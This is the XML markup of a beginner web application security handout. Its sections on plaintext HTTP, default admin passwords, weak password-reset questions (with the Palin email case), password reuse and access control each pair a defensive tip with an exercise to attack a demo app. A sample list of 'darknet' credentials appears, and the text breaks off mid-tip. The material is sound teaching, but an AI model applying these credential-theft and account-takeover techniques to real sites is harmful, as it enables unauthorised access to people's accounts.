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0FE51" w14:textId="07CF3A76" w:rsidR="009E3203" w:rsidRDefault="009E3203" w:rsidP="009E3203">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="0" w:name="_Hlk22738194"/>
      <w:bookmarkStart w:id="1" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="0"/>
      <w:bookmarkEnd w:id="1"/>
      <w:r>
        <w:t>Introduction to</w:t>
      </w:r>
      <w:r w:rsidR="00363F4B">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="004223FD">
        <w:t>Web App</w:t>
      </w:r>
      <w:r w:rsidR="00C84FB2">
        <w:t>lication</w:t>
      </w:r>
      <w:r w:rsidR="001D1BD0">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00CE3B51">
        <w:t>Security</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FE93063" w14:textId="77777777" w:rsidR="00ED3106" w:rsidRDefault="00ED3106" w:rsidP="009E3203">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="627E2D6C" w14:textId="16EFF849" w:rsidR="002B024C" w:rsidRDefault="007E5BCC" w:rsidP="00A461C6">
      <w:pPr>
        <w:pStyle w:val="Quote"/>
        <w:spacing w:before="200" w:after="200"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:t>Homegrown</w:t>
      </w:r>
      <w:r w:rsidR="002B024C">
        <w:t xml:space="preserve"> Demos</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FF1F9F6" w14:textId="1DA1685F" w:rsidR="00DB6743" w:rsidRDefault="006C2057" w:rsidP="00DB6743">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Unsecur</w:t>
      </w:r>
      <w:r w:rsidR="009566C7">
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00DB6743">
        <w:t>Protocol</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="010F54D2" w14:textId="62CE4B1B" w:rsidR="006203D9" w:rsidRDefault="006203D9" w:rsidP="006203D9">
      <w:r>
        <w:t xml:space="preserve">A web application running </w:t>
      </w:r>
      <w:r w:rsidR="001C4853">
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">n </w:t>
      </w:r>
      <w:r w:rsidR="00A06514">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r>
        <w:t>good</w:t>
      </w:r>
      <w:r w:rsidR="001C4853">
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">old </w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="00A06514">
        <w:t>HTTP</w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> protocol means all requests to and responses from the application </w:t>
      </w:r>
      <w:r w:rsidR="00B8573E">
        <w:t>travel</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in plain te</w:t>
      </w:r>
      <w:r w:rsidR="001C4853">
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">t. A </w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:t>man-in-the-middle</w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> attack will reveal all sensitive information</w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> including password</w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4435B8E8" w14:textId="2D0B77A4" w:rsidR="00DB6743" w:rsidRDefault="009E36E0" w:rsidP="006203D9">
      <w:r>
        <w:t xml:space="preserve">Tip: </w:t>
      </w:r>
      <w:r w:rsidR="006203D9">
        <w:t xml:space="preserve">Always run the web application </w:t>
      </w:r>
      <w:r w:rsidR="002807F5">
        <w:t>on</w:t>
      </w:r>
      <w:r w:rsidR="006203D9">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="003065AA">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="00382025">
        <w:t>HTTPS</w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="006203D9">
        <w:t xml:space="preserve"> protocol with a trust-worthy certificate.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C037419" w14:textId="202FAB8B" w:rsidR="00E219CC" w:rsidRDefault="00E219CC" w:rsidP="006203D9">
      <w:r>
        <w:t xml:space="preserve">Demo: The demo application is running </w:t>
      </w:r>
      <w:r w:rsidR="002807F5">
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">n </w:t>
      </w:r>
      <w:r w:rsidR="004F3533">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="00382025">
        <w:t>HTTP</w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> protocol. Can you capture user ids and passwords? </w:t>
      </w:r>
      <w:r w:rsidR="00A12276">
        <w:t>P</w:t>
      </w:r>
      <w:r w:rsidR="00521E19">
        <w:t>ress F12 to open the network tab</w:t>
      </w:r>
      <w:r w:rsidR="00A12276">
        <w:t xml:space="preserve"> and then click on send</w:t>
      </w:r>
      <w:r w:rsidR="00521E19">
        <w:t xml:space="preserve">.  </w:t>
      </w:r>
      <w:r w:rsidR="00773E0C">
        <w:t xml:space="preserve">Click on the page, make sure the </w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="00773E0C">
        <w:t>Headers</w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="00773E0C">
        <w:t xml:space="preserve"> tab is selected</w:t>
      </w:r>
      <w:r w:rsidR="004F3533">
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00773E0C">
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidR="004F3533">
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="009C2F5D">
        <w:t>croll down. Do you see the user id and password?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B89C3E5" w14:textId="77777777" w:rsidR="00CE3B51" w:rsidRDefault="007A133E" w:rsidP="00CE3B51">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Weak </w:t>
      </w:r>
      <w:r w:rsidR="003C1DCD">
        <w:t>Admin Password</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F2CCF61" w14:textId="347BF4FF" w:rsidR="00E23398" w:rsidRDefault="00E23398" w:rsidP="00E23398">
      <w:r>
        <w:t xml:space="preserve">Many web applications </w:t>
      </w:r>
      <w:r w:rsidR="008B4A9D">
        <w:t>require users to login</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. For example, anybody can try to log on to </w:t>
      </w:r>
      <w:hyperlink r:id="rId7" w:history="1">
        <w:r w:rsidRPr="00EE6B15">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://www.amazon.com/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> with a user id and password. To make matters worse, most of the packaged web applications</w:t>
      </w:r>
      <w:r w:rsidR="00D14AE1">
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="009905B4">
        <w:t>that you buy off the shel</w:t>
      </w:r>
      <w:r w:rsidR="004F3533">
        <w:t>f</w:t>
      </w:r>
      <w:r w:rsidR="00D14AE1">
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:r w:rsidR="009905B4">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>come with default admin user id and password</w:t>
      </w:r>
      <w:r w:rsidR="004F3533">
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and many companies neglect to change the default password. These passwords are well known and published </w:t>
      </w:r>
      <w:r w:rsidR="004F3533">
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">n many websites for free. Anybody can try </w:t>
      </w:r>
      <w:r w:rsidR="00301257">
        <w:t xml:space="preserve">to </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">login using these user ids and passwords. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="351C9601" w14:textId="04B49B82" w:rsidR="00444042" w:rsidRDefault="009E36E0" w:rsidP="00E23398">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Tip: </w:t>
      </w:r>
      <w:r w:rsidR="00444042">
        <w:t xml:space="preserve">Always change the default passwords on </w:t>
      </w:r>
      <w:r w:rsidR="00911F5A">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">operating system and </w:t>
      </w:r>
      <w:r w:rsidR="00444042">
        <w:t>application software you install.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24B36F12" w14:textId="1E6F8830" w:rsidR="005407F1" w:rsidRDefault="005407F1" w:rsidP="00E23398">
      <w:r>
        <w:t xml:space="preserve">Demo: The demo application has very easy to guess passwords for </w:t>
      </w:r>
      <w:r w:rsidR="00027D9D">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">admin account. Can you figure out </w:t>
      </w:r>
      <w:r w:rsidR="00027D9D">
        <w:t>what it is</w:t>
      </w:r>
      <w:r>
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12B8BCB0" w14:textId="77777777" w:rsidR="00573C45" w:rsidRDefault="00573C45" w:rsidP="00573C45">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Weak Password Reset</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="542B79C9" w14:textId="54586D08" w:rsidR="00712539" w:rsidRDefault="003B33DC" w:rsidP="00573C45">
      <w:r>
        <w:t>O</w:t>
      </w:r>
      <w:r w:rsidR="00573C45" w:rsidRPr="00573C45">
        <w:t xml:space="preserve">n September 16, 2008, during the </w:t>
      </w:r>
      <w:r w:rsidR="00712539">
        <w:t xml:space="preserve">US </w:t>
      </w:r>
      <w:r w:rsidR="00573C45" w:rsidRPr="00573C45">
        <w:t>presidential election campaign</w:t>
      </w:r>
      <w:r w:rsidR="00573C45">
        <w:t>, a</w:t>
      </w:r>
      <w:r w:rsidR="00712539">
        <w:t xml:space="preserve"> young man</w:t>
      </w:r>
      <w:r w:rsidR="00573C45">
        <w:t xml:space="preserve"> named </w:t>
      </w:r>
      <w:r w:rsidR="00573C45" w:rsidRPr="00573C45">
        <w:t xml:space="preserve">David </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00573C45" w:rsidRPr="00573C45">
        <w:t>Kernell</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00573C45">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00712539">
        <w:t>tried to</w:t>
      </w:r>
      <w:r w:rsidR="00573C45" w:rsidRPr="00573C45">
        <w:t xml:space="preserve"> reset </w:t>
      </w:r>
      <w:r w:rsidR="00573C45">
        <w:t xml:space="preserve">Sarah </w:t>
      </w:r>
      <w:r w:rsidR="00573C45" w:rsidRPr="00573C45">
        <w:t xml:space="preserve">Palin's </w:t>
      </w:r>
      <w:r w:rsidR="009E36E0">
        <w:t xml:space="preserve">email </w:t>
      </w:r>
      <w:r w:rsidR="00573C45" w:rsidRPr="00573C45">
        <w:t>password</w:t>
      </w:r>
      <w:r w:rsidR="009E36E0">
        <w:t xml:space="preserve"> on Yahoo</w:t>
      </w:r>
      <w:r w:rsidR="00712539">
        <w:t xml:space="preserve"> by answering security questions</w:t>
      </w:r>
      <w:r w:rsidR="00911F5A">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00C8693C">
        <w:t xml:space="preserve">All he needed were </w:t>
      </w:r>
      <w:r w:rsidR="00573C45" w:rsidRPr="00573C45">
        <w:t xml:space="preserve">her birthdate, </w:t>
      </w:r>
      <w:r>
        <w:t>zip</w:t>
      </w:r>
      <w:r w:rsidR="00573C45" w:rsidRPr="00573C45">
        <w:t xml:space="preserve"> code</w:t>
      </w:r>
      <w:r w:rsidR="00C8693C">
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00573C45" w:rsidRPr="00573C45">
        <w:t xml:space="preserve"> and where she met her spouse</w:t>
      </w:r>
      <w:r w:rsidR="00C8693C">
        <w:t>. He had no problem answering those questions.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> He got the birthdate and zip code by </w:t>
      </w:r>
      <w:r w:rsidR="00573C45" w:rsidRPr="00573C45">
        <w:t>Google search</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and learned from Palin</w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>'</w:t>
      </w:r>
      <w:r>
        <w:t>s speech that she married her high school sweetheart</w:t>
      </w:r>
      <w:r w:rsidR="00712539">
        <w:t xml:space="preserve"> and</w:t>
      </w:r>
      <w:r w:rsidR="0009625E">
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00712539">
        <w:t xml:space="preserve"> therefore</w:t>
      </w:r>
      <w:r w:rsidR="0009625E">
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00712539">
        <w:t xml:space="preserve"> must have met her spouse at high school</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00712539">
        <w:t xml:space="preserve"> What high school </w:t>
      </w:r>
      <w:r w:rsidR="00815211">
        <w:t>was that</w:t>
      </w:r>
      <w:r w:rsidR="00712539">
        <w:t>? Well, o</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ne more search revealed that would indeed be </w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:t>Wasilla High</w:t>
      </w:r>
      <w:r w:rsidR="003D547F">
        <w:t>."</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Then he accessed her email account and published some of her emails.</w:t>
      </w:r>
      <w:r w:rsidR="00C230F7">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22EC09A9" w14:textId="265694B4" w:rsidR="003B33DC" w:rsidRDefault="00C230F7" w:rsidP="00573C45">
      <w:r>
        <w:t>Weak security questions and s</w:t>
      </w:r>
      <w:r w:rsidR="008B6E70">
        <w:t>traightforward</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> answers to reset a password </w:t>
      </w:r>
      <w:r w:rsidR="00A74B04">
        <w:t>remains</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to be a </w:t>
      </w:r>
      <w:r w:rsidR="008B6E70">
        <w:t>significant</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> problem </w:t>
      </w:r>
      <w:r w:rsidR="00712539">
        <w:t xml:space="preserve">today </w:t>
      </w:r>
      <w:r>
        <w:t>with</w:t>
      </w:r>
      <w:r w:rsidR="00712539">
        <w:t xml:space="preserve"> many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> sites.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="543B529D" w14:textId="370976E4" w:rsidR="00444042" w:rsidRDefault="00D75A41" w:rsidP="00573C45">
      <w:r>
        <w:t xml:space="preserve">Tip: </w:t>
      </w:r>
      <w:r w:rsidR="00444042">
        <w:t xml:space="preserve">Always pick difficult security questions and answers. Be creative and deceiving. </w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="00444042">
        <w:t xml:space="preserve">Which city </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00444042">
        <w:t>were</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00444042">
        <w:t xml:space="preserve"> you born</w:t>
      </w:r>
      <w:r w:rsidR="00686484">
        <w:t xml:space="preserve"> in</w:t>
      </w:r>
      <w:r w:rsidR="00444042">
        <w:t>?</w:t>
      </w:r>
      <w:r w:rsidR="003065AA">
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t xml:space="preserve"> "</w:t>
      </w:r>
      <w:r w:rsidR="00686484">
        <w:t>Saturn</w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="00686484">
        <w:t xml:space="preserve"> would be an </w:t>
      </w:r>
      <w:r w:rsidR="0025045B">
        <w:t>exci</w:t>
      </w:r>
      <w:r w:rsidR="00686484">
        <w:t>ting but easy</w:t>
      </w:r>
      <w:r w:rsidR="0025045B">
        <w:t>-to-</w:t>
      </w:r>
      <w:r w:rsidR="00686484">
        <w:t>remember</w:t>
      </w:r>
      <w:r w:rsidR="001F55A0">
        <w:t xml:space="preserve"> answer</w:t>
      </w:r>
      <w:r w:rsidR="00686484">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="00686484">
        <w:t>What was the model of your first car?</w:t>
      </w:r>
      <w:r w:rsidR="003065AA">
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t xml:space="preserve"> "</w:t>
      </w:r>
      <w:r w:rsidR="00686484">
        <w:t>Boing747</w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="00686484">
        <w:t xml:space="preserve"> may not be such a bad answer.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02DD300C" w14:textId="2DDBEF00" w:rsidR="00573C45" w:rsidRDefault="00C230F7" w:rsidP="00573C45">
      <w:r>
        <w:t xml:space="preserve">Demo: </w:t>
      </w:r>
      <w:r w:rsidR="00A74B04">
        <w:t>Can you reset the administrator</w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>'</w:t>
      </w:r>
      <w:r w:rsidR="00A74B04">
        <w:t xml:space="preserve">s password using </w:t>
      </w:r>
      <w:r w:rsidR="00563551">
        <w:t xml:space="preserve">a </w:t>
      </w:r>
      <w:r w:rsidR="00A74B04">
        <w:t>weak reset process?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A88FC1F" w14:textId="77777777" w:rsidR="003F2CA3" w:rsidRDefault="003F2CA3" w:rsidP="003F2CA3">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Same Password on </w:t>
      </w:r>
      <w:r w:rsidR="007A133E">
        <w:t>Multiple</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Applications</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="743D2134" w14:textId="50D8F2D3" w:rsidR="00444042" w:rsidRDefault="007A133E" w:rsidP="007A133E">
      <w:r>
        <w:t>Passwords are hard to remember</w:t>
      </w:r>
      <w:r w:rsidR="00444042">
        <w:t>, particularly long and complex ones</w:t>
      </w:r>
      <w:r>
        <w:t>. To avoid confusion and frustration</w:t>
      </w:r>
      <w:r w:rsidR="00CC479D">
        <w:t xml:space="preserve"> with passwords,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> some people use the same password </w:t>
      </w:r>
      <w:r w:rsidR="004E22D7">
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:t>n multiple sites</w:t>
      </w:r>
      <w:r w:rsidR="001E60E5">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="004E22D7">
        <w:t>particularly</w:t>
      </w:r>
      <w:r w:rsidR="001E60E5">
        <w:t xml:space="preserve"> if </w:t>
      </w:r>
      <w:r w:rsidR="00070325">
        <w:t>it</w:t>
      </w:r>
      <w:r w:rsidR="008E33E1">
        <w:t xml:space="preserve"> is</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> very strong. </w:t>
      </w:r>
      <w:r w:rsidR="008E33E1">
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:t>f one of these sites is hacked, the user</w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>'</w:t>
      </w:r>
      <w:r>
        <w:t>s access is no</w:t>
      </w:r>
      <w:r w:rsidR="00CC479D">
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> compromised in many </w:t>
      </w:r>
      <w:r w:rsidR="00DC7E4B">
        <w:t>area</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="682FC70B" w14:textId="4919D64C" w:rsidR="007A133E" w:rsidRDefault="00D75A41" w:rsidP="007A133E">
      <w:r>
        <w:t>Tip: N</w:t>
      </w:r>
      <w:r w:rsidR="007A133E">
        <w:t xml:space="preserve">ever use the same password </w:t>
      </w:r>
      <w:r w:rsidR="00DC7E4B">
        <w:t>o</w:t>
      </w:r>
      <w:r w:rsidR="007A133E">
        <w:t>n two or more sites.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BF3D448" w14:textId="330C686B" w:rsidR="007A133E" w:rsidRDefault="007A133E" w:rsidP="007A133E">
      <w:r>
        <w:t xml:space="preserve">Demo: The following data was purchased on </w:t>
      </w:r>
      <w:r w:rsidR="002034B8">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r>
        <w:t>dar</w:t>
      </w:r>
      <w:r w:rsidR="00CC479D">
        <w:t>knet</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for a nominal fee:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2423751F" w14:textId="3B928346" w:rsidR="007A133E" w:rsidRDefault="00A46EA1" w:rsidP="007A133E">
      <w:pPr>
        <w:pStyle w:val="CSBody"/>
      </w:pPr>
      <w:r>
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="007A133E">
        <w:t>superuser</w:t>
      </w:r>
      <w:r>
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="007A133E">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="007A133E">
        <w:t>1234</w:t>
      </w:r>
      <w:r>
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F50EB1E" w14:textId="3A410520" w:rsidR="007A133E" w:rsidRDefault="00A46EA1" w:rsidP="007A133E">
      <w:pPr>
        <w:pStyle w:val="CSBody"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="007A133E">
        <w:t>tom</w:t>
      </w:r>
      <w:r>
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="007A133E">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="007A133E">
        <w:t>euyeu122*$</w:t>
      </w:r>
      <w:r>
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E58DB54" w14:textId="3104093F" w:rsidR="007A133E" w:rsidRDefault="00A46EA1" w:rsidP="007A133E">
      <w:pPr>
        <w:pStyle w:val="CSBody"/>
      </w:pPr>
      <w:r>
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="007A133E">
        <w:t>jerry</w:t>
      </w:r>
      <w:r>
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="007A133E">
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">" </w:t>
      </w:r>
      <w:r w:rsidR="007A133E">
        <w:t>123YespwREt45*10</w:t>
      </w:r>
      <w:r>
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11E3020E" w14:textId="5B344AB2" w:rsidR="007A133E" w:rsidRDefault="00A46EA1" w:rsidP="007A133E">
      <w:pPr>
        <w:pStyle w:val="CSBody"/>
      </w:pPr>
      <w:r>
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="007A133E">
        <w:t>Mary Beth</w:t>
      </w:r>
      <w:r>
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="007A133E">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="007A133E">
        <w:t>oJVo2KI1TxCHs6B6</w:t>
      </w:r>
      <w:r>
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CD29313" w14:textId="4605308B" w:rsidR="007A133E" w:rsidRDefault="00A46EA1" w:rsidP="007A133E">
      <w:pPr>
        <w:pStyle w:val="CSBody"/>
      </w:pPr>
      <w:r>
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="007A133E">
        <w:t>Robert</w:t>
      </w:r>
      <w:r>
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="007A133E">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="007A133E">
        <w:t>dy7e1788772939T1*</w:t>
      </w:r>
      <w:r>
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45611E63" w14:textId="77777777" w:rsidR="007A133E" w:rsidRDefault="008728A3" w:rsidP="007A133E">
      <w:r>
        <w:t xml:space="preserve">How can </w:t>
      </w:r>
      <w:r w:rsidR="007A133E">
        <w:t xml:space="preserve">you use this </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">information </w:t>
      </w:r>
      <w:r w:rsidR="007A133E">
        <w:t>to hack into our demo site?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39D797AE" w14:textId="77777777" w:rsidR="007230C5" w:rsidRDefault="007230C5" w:rsidP="007230C5">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Weak Access Control</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EE2AE47" w14:textId="04253C6F" w:rsidR="003F57B3" w:rsidRDefault="00224190" w:rsidP="007230C5">
      <w:r>
        <w:t>Applications ha</w:t>
      </w:r>
      <w:r w:rsidR="002034B8">
        <w:t>ve</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> access control that defines who can execute sensitive functions like create </w:t>
      </w:r>
      <w:r w:rsidR="00F95CC3">
        <w:t xml:space="preserve">a </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">user or delete </w:t>
      </w:r>
      <w:r w:rsidR="00F95CC3">
        <w:t xml:space="preserve">a </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">user. Typically, these options are </w:t>
      </w:r>
      <w:r w:rsidR="00F95CC3">
        <w:t>avai</w:t>
      </w:r>
      <w:r w:rsidR="005703F9">
        <w:t>l</w:t>
      </w:r>
      <w:r w:rsidR="00F95CC3">
        <w:t>able</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> if you have permission to </w:t>
      </w:r>
      <w:r w:rsidR="000F7F8F">
        <w:t>perform</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> these functions</w:t>
      </w:r>
      <w:r w:rsidR="000F7F8F">
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> but that</w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>'</w:t>
      </w:r>
      <w:r>
        <w:t>s never enough. In web application</w:t>
      </w:r>
      <w:r w:rsidR="000F7F8F">
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, these functions are invoked via URLs so anybody </w:t>
      </w:r>
      <w:r w:rsidR="003F57B3">
        <w:t xml:space="preserve">can type up the </w:t>
      </w:r>
      <w:r w:rsidR="004C400D">
        <w:t>URL</w:t>
      </w:r>
      <w:r w:rsidR="003F57B3">
        <w:t xml:space="preserve"> even when he/she does not have permission to execute the </w:t>
      </w:r>
      <w:r w:rsidR="000F7F8F">
        <w:t>opera</w:t>
      </w:r>
      <w:r w:rsidR="003F57B3">
        <w:t>tion</w:t>
      </w:r>
      <w:r w:rsidR="000F7F8F">
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="003F57B3">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="794498E1" w14:textId="4F3E5129" w:rsidR="003F57B3" w:rsidRDefault="004C400D" w:rsidP="007230C5">
      <w:r>
        <w:t>Tip: C</w:t>
      </w:r>
